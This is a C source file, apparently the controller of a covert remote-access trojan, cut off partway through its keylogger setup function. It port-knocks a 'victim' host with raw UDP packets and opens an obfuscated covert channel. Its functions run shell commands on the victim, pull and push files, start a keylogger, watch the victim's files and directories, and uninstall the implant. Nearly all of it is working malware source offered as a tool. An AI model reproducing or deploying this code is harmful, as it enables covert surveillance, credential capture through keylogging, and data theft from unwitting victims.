#include <arpa/inet.h>
#include <errno.h>
#include <ifaddrs.h>
#include "keylogger.h"
#include <net/if.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include "protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define MENU_BUFFER_SIZE 1024
#define DEFAULT_KNOCK_DELAY_MS 150
#define DEFAULT_KEYLOGGER_DEVICE KEYLOGGER_AUTO_DEVICE
#define DEFAULT_KEYLOG_REMOTE KEYLOGGER_LOG_FILE
#define RESPONSE_TIMEOUT_MS 5000
#define EXEC_RESPONSE_TIMEOUT_MS 30000
#define MENU_INVALID -1
#define MENU_EOF     -2

static char *format_safe(char *dst, size_t dstlen, const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    (void)vsnprintf(dst, dstlen, fmt, ap);
    va_end(ap);
    return dst;
}

typedef struct {
    int sock;
    void *pcap_handle;
    struct sockaddr_in peer_addr;
    struct in_addr local_addr;
    uint32_t next_seq;
    uint32_t expected_response_seq;
    int connected;
    char peer_ip[INET_ADDRSTRLEN];
} session_t;

typedef struct {
    char victim_ip[INET_ADDRSTRLEN];
    int auto_connect;
} commander_config_t;

typedef struct {
    int sock;
    int running;
    int available;
    pthread_t thread_id;
} collector_listener_t;

static void usage(const char *prog);
static int parse_args(int argc, char **argv, commander_config_t *cfg);
static int read_line(const char *prompt, char *buf, size_t buf_len);
static int read_menu_choice(void);
static int is_valid_ipv4(const char *ip);
static int set_victim_ip(commander_config_t *cfg);
static int port_knock(const char *victim_ip);
static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id);
static void sleep_ms(long milliseconds);
static int session_open(session_t *session, const char *victim_ip);
static void session_close(session_t *session);
static int session_send_packet(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int session_send_ack(session_t *session);
static int session_send_raw(const session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int session_open_pcap(session_t *session);
static void session_close_pcap(session_t *session);
static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int session_receive_packet(session_t *session, parsed_packet_t *parsed, uint8_t *packet, size_t packet_size, int timeout_ms);
static int session_receive_status_response(session_t *session, int print_response);
static int session_receive_exec_response(session_t *session);
static int session_receive_file_response(session_t *session, const char *local_path);
static void print_status_response(const parsed_packet_t *packet);
static void print_payload_text(const uint8_t *payload, uint16_t payload_len, int trim_nul);
static void init_collector_listener(collector_listener_t *collector);
static int start_collector_listener(collector_listener_t *collector);
static void stop_collector_listener(collector_listener_t *collector);
static void *collector_listener_thread(void *arg);
static int bind_udp_listener(uint16_t port);
static void print_collector_message(const network_message_t *incoming);
static int read_keylogger_device(char *device_path, size_t device_path_len);
static int start_keylogger(session_t *session);
static int stop_keylogger(session_t *session);
static int read_path_with_default(const char *prompt, const char *default_value, char *buf, size_t buf_len);
static const char *path_basename(const char *path);
static int transfer_keylog_file(session_t *session);
static int transfer_file_from_victim(session_t *session);
static int transfer_remote_file_to_local(session_t *session, const char *remote_path, const char *local_path);
static int transfer_file_to_victim(session_t *session);
static int watch_file_on_victim(session_t *session);
static int watch_directory_on_victim(session_t *session);
static int run_victim_command(session_t *session);
static int uninstall_victim(session_t *session, int *exit_requested);
static void print_disconnected_menu(const commander_config_t *cfg);
static void print_connected_menu(const session_t *session);
static void disconnected_loop(commander_config_t *cfg, session_t *session, const collector_listener_t *collector, int *exit_requested);
static void connected_loop(session_t *session, const collector_listener_t *collector, int *exit_requested);

int main(int argc, char **argv) {
    commander_config_t cfg;
    session_t session;
    collector_listener_t collector;
    int exit_requested = 0;

    memset(&cfg, 0, sizeof(cfg));
    memset(&session, 0, sizeof(session));
    session.sock = -1;
    snprintf(cfg.victim_ip, sizeof(cfg.victim_ip), "%s", "127.0.0.1");
    init_collector_listener(&collector);

    if (parse_args(argc, argv, &cfg) != 0) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    printf("Commander started\n");
    if (start_collector_listener(&collector) != 0) {
        fprintf(stderr, "Collector listener unavailable on UDP port %u; watch events will not be shown\n",
                (unsigned)COLLECTOR_PORT);
    }

    if (cfg.auto_connect) {
        printf("Connecting to %s...\n", cfg.victim_ip);
        if (port_knock(cfg.victim_ip) == 0) {
            sleep_ms(1500);
            if (session_open(&session, cfg.victim_ip) == 0) {
                printf("Session active with %s\n", session.peer_ip);
            } else {
                fprintf(stderr, "Connection failed\n");
            }
        } else {
            fprintf(stderr, "Connection failed\n");
        }
    }

    while (!exit_requested) {
        if (session.connected) {
            connected_loop(&session, &collector, &exit_requested);
        } else {
            disconnected_loop(&cfg, &session, &collector, &exit_requested);
        }
    }

    session_close(&session);
    stop_collector_listener(&collector);
    printf("Commander exiting\n");
    return EXIT_SUCCESS;
}

static void usage(const char *prog) {
    fprintf(stderr, "Usage: %s [victim_ip] [--connect]\n", prog);
    fprintf(stderr, "  victim_ip   IPv4 address of the victim. Defaults to 127.0.0.1.\n");
    fprintf(stderr, "  --connect   Port-knock and open the session before showing the menu.\n");
}

static int parse_args(int argc, char **argv, commander_config_t *cfg) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            return -1;
        }

        if (strcmp(argv[i], "--connect") == 0 || strcmp(argv[i], "-c") == 0) {
            cfg->auto_connect = 1;
            continue;
        }

        if (!is_valid_ipv4(argv[i])) {
            fprintf(stderr, "Invalid IPv4 address or option: %s\n", argv[i]);
            return -1;
        }

        snprintf(cfg->victim_ip, sizeof(cfg->victim_ip), "%s", argv[i]);
    }

    return 0;
}

static int read_line(const char *prompt, char *buf, size_t buf_len) {
    size_t len;

    if (prompt != NULL) {
        printf("%s", prompt);
        fflush(stdout);
    }

    if (fgets(buf, (int)buf_len, stdin) == NULL) {
        return -1;
    }

    len = strlen(buf);
    if (len > 0 && buf[len - 1] == '\n') {
        buf[len - 1] = '\0';
    }

    return 0;
}

static int read_menu_choice(void) {
    char buf[MENU_BUFFER_SIZE];
    char *end = NULL;
    long choice;

    if (read_line("> ", buf, sizeof(buf)) != 0) {
        return MENU_EOF;
    }

    errno = 0;
    choice = strtol(buf, &end, 10);
    if (errno != 0 || end == buf || *end != '\0') {
        return MENU_INVALID;
    }

    return (int)choice;
}

static int is_valid_ipv4(const char *ip) {
    struct sockaddr_in addr;
    return ip != NULL && inet_pton(AF_INET, ip, &addr.sin_addr) == 1;
}

static int set_victim_ip(commander_config_t *cfg) {
    char ip[MENU_BUFFER_SIZE];

    if (read_line("Victim IPv4 address: ", ip, sizeof(ip)) != 0) {
        return -1;
    }

    if (!is_valid_ipv4(ip)) {
        fprintf(stderr, "Invalid IPv4 address\n");
        return -1;
    }

    format_safe(cfg->victim_ip, sizeof(cfg->victim_ip), "%s", ip);
    return 0;
}

static int port_knock(const char *victim_ip) {
    uint32_t session_token;
    int result = 0;

    session_token = protocol_knock_session_token(SEQ_INIT);

    printf("Port-knocking %s on UDP ports", victim_ip);
    for (uint16_t i = 0; i < KNOCK_PORT_COUNT; i++) {
        uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
        uint16_t ip_id = protocol_encode_ip_id((uint8_t)i, session_token);
        printf(" %u", (unsigned)port);
        fflush(stdout);

        if (send_raw_knock(victim_ip, port, ip_id) != 0) {
            result = -1;
            break;
        }

        sleep_ms(DEFAULT_KNOCK_DELAY_MS);
    }

    printf("\n");
    return result;
}

static uint16_t ip_checksum(const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;

    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(const uint8_t *)p;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFFu) + (sum >> 16);
    }
    return (uint16_t)(~sum & 0xFFFFu);
}

static int get_local_ip(struct in_addr *out_addr) {
    struct ifaddrs *ifaddr;
    struct ifaddrs *ifa;
    int found = 0;

    if (getifaddrs(&ifaddr) != 0) {
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if ((ifa->ifa_flags & IFF_UP) == 0) continue;
        if ((ifa->ifa_flags & IFF_LOOPBACK) != 0) continue;
        if ((ifa->ifa_flags & IFF_RUNNING) == 0) continue;
        *out_addr = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        if (out_addr->s_addr != 0) {
            found = 1;
            break;
        }
    }

    freeifaddrs(ifaddr);
    return found ? 0 : -1;
}

static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) {
    int sock;
    struct sockaddr_in dest;
    uint8_t packet[sizeof(struct ip) + 128];
    struct ip *ip_data;
    struct {
        uint16_t src_port;
        uint16_t dst_port;
        uint16_t length;
        uint16_t checksum;
    } udp_hdr;
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } pseudo;
    int enabled;
    size_t total_len;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        int saved = errno;
        fprintf(stderr, "Raw socket unavailable (%s); try running as root\n", strerror(saved));
        return -1;
    }

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    if (inet_pton(AF_INET, victim_ip, &dest.sin_addr) != 1) {
        close(sock);
        return -1;
    }

    enabled = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enabled, sizeof(enabled)) != 0) {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        return -1;
    }

    struct in_addr local_ip;
    if (get_local_ip(&local_ip) != 0) {
        close(sock);
        return -1;
    }

    memset(packet, 0, sizeof(packet));
    ip_data = (struct ip *)packet;

    total_len = sizeof(struct ip) + sizeof(udp_hdr);

    ip_data->ip_v   = 4;
    ip_data->ip_hl  = 5;
    ip_data->ip_tos = 0;
    ip_data->ip_id  = htons(ip_id);
    ip_data->ip_off = 0;
    ip_data->ip_ttl = 64;
    ip_data->ip_p   = IPPROTO_UDP;
    ip_data->ip_src = local_ip;
    ip_data->ip_dst = dest.sin_addr;

#ifdef __APPLE__
    ip_data->ip_len = (uint16_t)total_len;
#else
    ip_data->ip_len = htons((uint16_t)total_len);
#endif

    ip_data->ip_sum = 0;
    ip_data->ip_sum = ip_checksum(ip_data, sizeof(struct ip));

    memset(&udp_hdr, 0, sizeof(udp_hdr));
    udp_hdr.src_port = 0;
    udp_hdr.dst_port = htons(port);
    udp_hdr.length    = htons(sizeof(udp_hdr));
    udp_hdr.checksum  = 0;

    memset(&pseudo, 0, sizeof(pseudo));
    pseudo.src   = local_ip.s_addr;
    pseudo.dst   = ip_data->ip_dst.s_addr;
    pseudo.zero  = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len   = htons(sizeof(udp_hdr));
    {
        uint8_t pseudo_buf[sizeof(pseudo) + sizeof(udp_hdr)];
        memcpy(pseudo_buf, &pseudo, sizeof(pseudo));
        memcpy(pseudo_buf + sizeof(pseudo), &udp_hdr, sizeof(udp_hdr));
        udp_hdr.checksum = ip_checksum(pseudo_buf, sizeof(pseudo_buf));
    }

    memcpy(packet + sizeof(struct ip), &udp_hdr, sizeof(udp_hdr));

    sendto(sock, packet, total_len, 0, (struct sockaddr *)&dest, sizeof(dest));
    close(sock);
    return 0;
}

static void sleep_ms(long milliseconds) {
    struct timespec req;

    req.tv_sec = milliseconds / 1000;
    req.tv_nsec = (milliseconds % 1000) * 1000000L;

    while (nanosleep(&req, &req) == -1 && errno == EINTR) {
    }
}

static int session_open(session_t *session, const char *victim_ip) {
    int sock;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket raw");
        return -1;
    }

    memset(session, 0, sizeof(*session));
    session->sock = sock;
    session->peer_addr.sin_family = AF_INET;
    session->peer_addr.sin_port = htons(COVERT_PORT);
    session->next_seq = SEQ_INIT;
    session->expected_response_seq = SEQ_INIT;

    if (inet_pton(AF_INET, victim_ip, &session->peer_addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid victim IPv4 address: %s\n", victim_ip);
        session_close(session);
        return -1;
    }

    snprintf(session->peer_ip, sizeof(session->peer_ip), "%s", victim_ip);
    session->connected = 1;

    if (get_local_ip(&session->local_addr) != 0) {
        fprintf(stderr, "Unable to determine local IP address for raw sockets\n");
        session_close(session);
        return -1;
    }

    if (session_open_pcap(session) != 0) {
        session_close(session);
        return -1;
    }

    if (session_send_command(session, CMD_HEARTBEAT, NULL, 0) != 0) {
        session_close(session);
        return -1;
    }

    return 0;
}

static int session_open_pcap(session_t *session) {
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    char filter_expr[256];

    session->pcap_handle = pcap_open_live("any", 65535, 1, 500, errbuf);
    if (session->pcap_handle == NULL) {
        session->pcap_handle = pcap_open_live("lo0", 65535, 1, 500, errbuf);
    }
    if (session->pcap_handle == NULL) {
        session->pcap_handle = pcap_open_live("lo", 65535, 1, 500, errbuf);
    }
    if (session->pcap_handle == NULL) {
        pcap_if_t *alldevs;
        if (pcap_findalldevs(&alldevs, errbuf) == 0 && alldevs != NULL) {
            session->pcap_handle = pcap_open_live(alldevs->name, 65535, 1, 500, errbuf);
            pcap_freealldevs(alldevs);
        }
    }
    if (session->pcap_handle == NULL) {
        fprintf(stderr, "Unable to open pcap for session receive\n");
        return -1;
    }

    snprintf(filter_expr, sizeof(filter_expr), "udp dst port %u and src host %s",
             (unsigned)COVERT_PORT, session->peer_ip);
    if (pcap_compile((pcap_t *)session->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
        (void)pcap_setfilter((pcap_t *)session->pcap_handle, &filter);
        pcap_freecode(&filter);
    }
    return 0;
}

static void session_close_pcap(session_t *session) {
    if (session->pcap_handle != NULL) {
        pcap_close((pcap_t *)session->pcap_handle);
        session->pcap_handle = NULL;
    }
}

static void session_close(session_t *session) {
    session_close_pcap(session);
    if (session->sock >= 0) {
        close(session->sock);
    }
    memset(session, 0, sizeof(*session));
    session->sock = -1;
}

static int session_send_raw(const session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    uint8_t raw_packet[PACKET_SIZE_MAX + sizeof(struct ip) + 64];
    struct ip *ip_data;
    size_t total_len;
    uint16_t udp_payload_len;
    uint8_t obfuscated[PROTOCOL_PACKET_PAYLOAD_MAX];
    uint32_t obfuscation_key;
    uint16_t src_port_val;
    covert_header_t header;
    uint16_t checksum;
    struct {
        uint16_t src_port;
        uint16_t dst_port;
        uint16_t length;
        uint16_t checksum;
    } udp_hdr;
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } pseudo;

    memcpy(obfuscated, payload, payload_len);
    obfuscation_key = protocol_derive_obfuscation_key(SEQ_INIT);
    protocol_obfuscate_payload(obfuscated, payload_len, obfuscation_key);

    header.seq_num = htonl(session->next_seq);
    header.command = command;
    header.payload_len = htons(payload_len);

    {
        uint8_t proto_buf[PACKET_SIZE_MAX];
        memcpy(proto_buf, &header, sizeof(header));
        if (payload_len > 0) memcpy(proto_buf + sizeof(header), obfuscated, payload_len);
        checksum = htons(protocol_compute_checksum(proto_buf, sizeof(header) + payload_len));
    }

    src_port_val = htons((uint16_t)(session->next_seq & 0xFFFFu));

    udp_payload_len = (uint16_t)(sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE);
    memset(&udp_hdr, 0, sizeof(udp_hdr));
    udp_hdr.src_port = src_port_val;
    udp_hdr.dst_port = htons(COVERT_PORT);
    udp_hdr.length    = htons((uint16_t)(sizeof(udp_hdr) + udp_payload_len));
    udp_hdr.checksum  = 0;

    total_len = sizeof(struct ip) + sizeof(udp_hdr) + udp_payload_len;

    memset(raw_packet, 0, sizeof(raw_packet));
    ip_data = (struct ip *)raw_packet;
    ip_data->ip_v   = 4;
    ip_data->ip_hl  = 5;
    ip_data->ip_tos = 0;
    ip_data->ip_id  = htons((uint16_t)((OBFUSCATION_KEY_BASE >> 16) & 0xFFFFu));
    ip_data->ip_off = 0;
    ip_data->ip_ttl = 64;
    ip_data->ip_p   = IPPROTO_UDP;
    ip_data->ip_src = session->local_addr;
    ip_data->ip_dst = session->peer_addr.sin_addr;
#ifdef __APPLE__
    ip_data->ip_len = (uint16_t)total_len;
#else
    ip_data->ip_len = htons((uint16_t)total_len);
#endif
    ip_data->ip_sum = 0;
    ip_data->ip_sum = ip_checksum(ip_data, sizeof(struct ip));

    memset(&pseudo, 0, sizeof(pseudo));
    pseudo.src = session->local_addr.s_addr;
    pseudo.dst = session->peer_addr.sin_addr.s_addr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len = htons((uint16_t)(sizeof(udp_hdr) + udp_payload_len));
    {
        uint8_t pseudo_buf[sizeof(pseudo) + sizeof(udp_hdr) + udp_payload_len];
        memcpy(pseudo_buf, &pseudo, sizeof(pseudo));
        memcpy(pseudo_buf + sizeof(pseudo), &udp_hdr, sizeof(udp_hdr));
        memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr), &header, sizeof(header));
        if (payload_len > 0) memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr) + sizeof(header), obfuscated, payload_len);
        memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr) + sizeof(header) + payload_len, &checksum, CHECKSUM_SIZE);
        udp_hdr.checksum = ip_checksum(pseudo_buf, sizeof(pseudo_buf));
    }

    memcpy(raw_packet + sizeof(struct ip), &udp_hdr, sizeof(udp_hdr));
    memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr), &header, sizeof(header));
    if (payload_len > 0) memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr) + sizeof(header), obfuscated, payload_len);
    memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr) + sizeof(header) + payload_len, &checksum, CHECKSUM_SIZE);

    {
        int hinc = 1;
        (void)setsockopt(session->sock, IPPROTO_IP, IP_HDRINCL, &hinc, sizeof(hinc));
    }

    if (sendto(session->sock, raw_packet, total_len, 0,
               (struct sockaddr *)&session->peer_addr, sizeof(session->peer_addr)) < 0) {
        perror("sendto raw");
        return -1;
    }
    return 0;
}

static int session_send_packet(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    int result;

    if (!session->connected || session->sock < 0) {
        fprintf(stderr, "No active session\n");
        return -1;
    }

    result = session_send_raw(session, command, payload, payload_len);
    if (result == 0) {
        session->next_seq++;
    }
    return result;
}

static int session_send_ack(session_t *session) {
    return session_send_packet(session, CMD_ACK, NULL, 0);
}

static parsed_packet_t g_commander_parsed;
static uint8_t *g_commander_pkt = NULL;
static size_t g_commander_pkt_size = 0;
static int g_commander_pkt_ready = 0;
static uint32_t g_commander_last_dup_seq = 0;
static int g_commander_dup_count = 0;

static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    session_t *session = (session_t *)args;
    const u_char *ip_hdr;
    uint16_t ether_type;
    int ip_header_len;
    uint16_t src_port;
    uint16_t dst_port;
    int pcap_dl;

    (void)header;

    pcap_dl = pcap_datalink((pcap_t *)session->pcap_handle);

    if (pcap_dl == DLT_LINUX_SLL) {
        uint16_t proto; memcpy(&proto, packet + 14, 2);
        if (ntohs(proto) != 0x0800) return;
        ip_hdr = packet + 16;
    } else if (pcap_dl == DLT_LINUX_SLL2) {
        uint16_t proto; memcpy(&proto, packet + 18, 2);
        if (ntohs(proto) != 0x0800) return;
        ip_hdr = packet + 20;
    } else if (pcap_dl == DLT_NULL) {
        uint32_t family; memcpy(&family, packet, 4);
        if (family != 2) return;
        ip_hdr = packet + 4;
    } else if (pcap_dl == DLT_EN10MB) {
        memcpy(&ether_type, packet + 12, 2);
        if (ntohs(ether_type) != 0x0800) return;
        ip_hdr = packet + 14;
    } else if (pcap_dl == DLT_RAW) {
        ip_hdr = packet;
    } else {
        return;
    }

    if ((ip_hdr[0] & 0xF0) != 0x40) return;
    if (ip_hdr[9] != 17) return;

    ip_header_len = (ip_hdr[0] & 0x0F) * 4;

    {
        struct in_addr src_addr;
        memcpy(&src_addr, ip_hdr + 12, 4);
        if (src_addr.s_addr != session->peer_addr.sin_addr.s_addr) {
            return;
        }
    }

    {
        const u_char *udp_hdr = ip_hdr + ip_header_len;
        memcpy(&src_port, udp_hdr, 2);
        memcpy(&dst_port, udp_hdr + 2, 2);
        dst_port = ntohs(dst_port);

        const u_char *payload_ptr = udp_hdr + 8;
        size_t payload_sz = (size_t)(packet + header->caplen - payload_ptr);

        if (payload_sz > g_commander_pkt_size) payload_sz = g_commander_pkt_size;
        if (payload_sz >= sizeof(covert_header_t) + CHECKSUM_SIZE) {
            memcpy(g_commander_pkt, payload_ptr, payload_sz);
            parsed_packet_t p;
            char e[128];
            if (protocol_parse_packet(g_commander_pkt, payload_sz, &p, e, sizeof(e)) == 0) {
                if (p.seq_num == g_commander_last_dup_seq && p.command == g_commander_parsed.command) {
                    g_commander_dup_count++;
                    return;
                }
                g_commander_parsed = p;
                g_commander_last_dup_seq = p.seq_num;
                g_commander_dup_count = 0;
                g_commander_parsed.payload = g_commander_pkt + sizeof(covert_header_t);
                g_commander_pkt_size = payload_sz;
                g_commander_pkt_ready = 1;
                pcap_breakloop((pcap_t *)session->pcap_handle);
            }
        }
        (void)src_port;
    }
}

static int session_receive_packet(session_t *session, parsed_packet_t *parsed, uint8_t *packet, size_t packet_size, int timeout_ms) {
    g_commander_pkt = packet;
    g_commander_pkt_size = packet_size;
    g_commander_pkt_ready = 0;
    g_commander_parsed.seq_num = 0;
    g_commander_parsed.command = 0;
    g_commander_parsed.payload_len = 0;
    g_commander_parsed.payload = NULL;
    g_commander_last_dup_seq = 0;
    g_commander_dup_count = 0;

    {
        struct timeval start;
        gettimeofday(&start, NULL);

        while (1) {
            struct timeval now;
            long elapsed;

            pcap_dispatch((pcap_t *)session->pcap_handle, -1, pcap_session_handler, (u_char *)session);

            if (g_commander_pkt_ready) {
                break;
            }

            gettimeofday(&now, NULL);
            elapsed = (now.tv_sec - start.tv_sec) * 1000L + (now.tv_usec - start.tv_usec) / 1000L;
            if (elapsed >= (long)timeout_ms) {
                fprintf(stderr, "Timed out waiting for victim response\n");
                g_commander_pkt = NULL;
                return -1;
            }
        }
    }

    *parsed = g_commander_parsed;
    g_commander_pkt = NULL;

    if (parsed->seq_num < session->expected_response_seq) {
        printf("Ignoring stale response sequence 0x%08x (expected 0x%08x)\n",
               parsed->seq_num, session->expected_response_seq);
        return session_receive_packet(session, parsed, packet, packet_size, timeout_ms);
    }

    if (parsed->seq_num != session->expected_response_seq) {
        fprintf(stderr, "Response sequence mismatch: received 0x%08x, expected 0x%08x\n",
                parsed->seq_num, session->expected_response_seq);
        return -1;
    }

    session->expected_response_seq++;
    return 0;
}

static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    if (session_send_packet(session, command, payload, payload_len) != 0) {
        return -1;
    }

    if (command == CMD_EXEC_CMD) {
        return session_receive_exec_response(session);
    }

    return session_receive_status_response(session, 1);
}

static int session_receive_status_response(session_t *session, int print_response) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;

    if (session_receive_packet(session, &parsed, packet, sizeof(packet), RESPONSE_TIMEOUT_MS) != 0) {
        return -1;
    }

    if (print_response) {
        print_status_response(&parsed);
    }

    return parsed.command == CMD_ERROR ? -1 : 0;
}

static int session_receive_exec_response(session_t *session) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;
    int saw_output = 0;
    int output_ended_with_newline = 1;

    while (1) {
        if (session_receive_packet(session, &parsed, packet, sizeof(packet), EXEC_RESPONSE_TIMEOUT_MS) != 0) {
            return -1;
        }

        if (parsed.command == CMD_EXEC_OUTPUT) {
            if (!saw_output) {
                printf("Victim output:\n");
                saw_output = 1;
            }

            if (parsed.payload_len > 0) {
                fwrite(parsed.payload, 1, parsed.payload_len, stdout);
                output_ended_with_newline = parsed.payload[parsed.payload_len - 1] == '\n';
            }
            fflush(stdout);

            if (session_send_ack(session) != 0) {
                return -1;
            }
            continue;
        }

        if (saw_output && !output_ended_with_newline) {
            printf("\n");
        }

        print_status_response(&parsed);
        return parsed.command == CMD_ERROR ? -1 : 0;
    }
}

static int session_receive_file_response(session_t *session, const char *local_path) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;
    char temp_path[LOCAL_PATH_MAX + 8];
    FILE *fp;
    int write_failed = 0;

    snprintf(temp_path, sizeof(temp_path), "%s", local_path);
    fp = fopen(temp_path, "wb");
    if (fp == NULL) {
        fprintf(stderr, "Unable to open %s for writing: %s\n", temp_path, strerror(errno));
        return -1;
    }

    while (1) {
        if (session_receive_packet(session, &parsed, packet, sizeof(packet), EXEC_RESPONSE_TIMEOUT_MS) != 0) {
            fclose(fp);
            remove(temp_path);
            return -1;
        }

        if (parsed.command == CMD_FILE_DATA) {
            if (!write_failed &&
                parsed.payload_len > 0 &&
                fwrite(parsed.payload, 1, parsed.payload_len, fp) != parsed.payload_len) {
                fprintf(stderr, "Failed to write %s: %s\n", temp_path, strerror(errno));
                write_failed = 1;
            }

            if (session_send_ack(session) != 0) {
                fclose(fp);
                remove(temp_path);
                return -1;
            }
            continue;
        }

        fclose(fp);
        if (write_failed) {
            remove(temp_path);
            fprintf(stderr, "Discarded incomplete local file %s\n", temp_path);
            return -1;
        }

        print_status_response(&parsed);
        if (parsed.command == CMD_ERROR) {
            remove(temp_path);
            return -1;
        }

        return 0;
    }
}

static void print_status_response(const parsed_packet_t *packet) {
    printf("Victim %s: ", protocol_command_name(packet->command));
    print_payload_text(packet->payload, packet->payload_len, 1);
}

static void print_payload_text(const uint8_t *payload, uint16_t payload_len, int trim_nul) {
    size_t len = payload_len;

    if (trim_nul && len > 0 && payload[len - 1] == '\0') {
        len--;
    }

    if (len > 0 && payload != NULL) {
        fwrite(payload, 1, len, stdout);
        if (payload[len - 1] != '\n') {
            printf("\n");
        }
    } else {
        printf("(empty response)\n");
    }
}

static void init_collector_listener(collector_listener_t *collector) {
    memset(collector, 0, sizeof(*collector));
    collector->sock = -1;
}

static int start_collector_listener(collector_listener_t *collector) {
    collector->sock = bind_udp_listener(COLLECTOR_PORT);
    if (collector->sock < 0) {
        return -1;
    }

    collector->running = 1;
    collector->available = 1;

    if (pthread_create(&collector->thread_id, NULL, collector_listener_thread, collector) != 0) {
        perror("pthread_create collector");
        close(collector->sock);
        collector->sock = -1;
        collector->running = 0;
        collector->available = 0;
        return -1;
    }

    printf("Collector listening on UDP port %u\n", (unsigned)COLLECTOR_PORT);
    return 0;
}

static void stop_collector_listener(collector_listener_t *collector) {
    if (!collector->available) {
        return;
    }

    collector->running = 0;
    (void)pthread_join(collector->thread_id, NULL);

    if (collector->sock >= 0) {
        close(collector->sock);
        collector->sock = -1;
    }

    collector->available = 0;
}

static void *collector_listener_thread(void *arg) {
    collector_listener_t *collector = (collector_listener_t *)arg;

    while (collector->running) {
        fd_set read_fds;
        struct timeval timeout;
        network_message_t incoming;
        ssize_t received;

        FD_ZERO(&read_fds);
        FD_SET(collector->sock, &read_fds);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        received = select(collector->sock + 1, &read_fds, NULL, NULL, &timeout);
        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select collector");
            break;
        }

        if (received == 0) {
            continue;
        }

        memset(&incoming, 0, sizeof(incoming));
        received = recvfrom(collector->sock, &incoming, sizeof(incoming), 0, NULL, NULL);
        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("recvfrom collector");
            break;
        }

        print_collector_message(&incoming);
    }

    return NULL;
}

static int bind_udp_listener(uint16_t port) {
    int sock;
    int enabled = 1;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(enabled)) != 0) {
        perror("setsockopt SO_REUSEADDR");
        close(sock);
        return -1;
    }

#ifdef SO_REUSEPORT
    (void)setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &enabled, sizeof(enabled));
#endif

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fprintf(stderr, "bind UDP port %u failed: %s\n", (unsigned)port, strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static void print_collector_message(const network_message_t *incoming) {
    size_t payload_len;

    if (incoming->payload_len >= 0 && incoming->payload_len <= FILE_CHUNK) {
        payload_len = (size_t)incoming->payload_len;
    } else {
        payload_len = strnlen(incoming->payload, sizeof(incoming->payload));
    }

    if (incoming->message_type != MSG_DIRECTORY_EVENT) {
        return;
    }

    printf("\n[collector] Alert: ");

    if (payload_len > 0) {
        fwrite(incoming->payload, 1, payload_len, stdout);
        if (incoming->payload[payload_len - 1] != '\n') {
            printf("\n");
        }
    } else {
        printf("(empty)\n");
    }

    fflush(stdout);
}

static int read_keylogger_device(char *device_path, size_t device_path_len) {
    char input[MENU_BUFFER_SIZE];
    const char *selected_path;

    printf("Keyboard device path [%s]: ", DEFAULT_KEYLOGGER_DEVICE);
    fflush(stdout);

